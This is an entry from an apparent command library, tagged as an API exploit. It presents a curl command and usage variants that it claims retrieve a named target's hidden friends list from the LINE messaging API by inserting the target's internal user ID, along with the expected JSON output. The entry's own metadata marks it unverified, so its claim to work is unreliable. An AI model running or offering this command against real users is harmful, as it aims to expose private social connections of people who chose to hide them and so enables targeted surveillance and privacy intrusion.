---
id: cmd-uuid-2
data: >-
  curl -X GET
  "https://api.line.me/v2/timeline/hidden_friends?user_id=TARGET_INTERNAL_ID" -H
  "Accept: application/json"
tags:
  - api-exploit
  - data-retrieval
type: command
output: null
executor: bash
platforms:
  - Web
  - Mobile API
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.931Z'
verified: false
validated: true
submitted: true
---
# curl-hidden-friends-retrieve

## Command

```bash
curl -X GET "https://api.line.me/v2/timeline/hidden_friends?user_id=TARGET_INTERNAL_ID" -H "Accept: application/json"
```

## Description

This command exploits the LINE API to retrieve a target user's hidden friends list by injecting their internal ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `?user_id=TARGET_INTERNAL_ID` | Target user ID parameter | Yes |
| `-H "Accept: application/json"` | JSON response format | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.line.me/v2/timeline/hidden_friends?user_id=12345" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -s -X GET "https://api.line.me/v2/timeline/hidden_friends?user_id=12345" -H "Accept: application/json" | jq '.["hidden_friends"]'
```

## Expected Output

JSON object with hidden friends array, e.g., {"hidden_friends": [{"id": "67890", "privacy": "hidden"}]}.

## Related

- [[Related Procedure]]
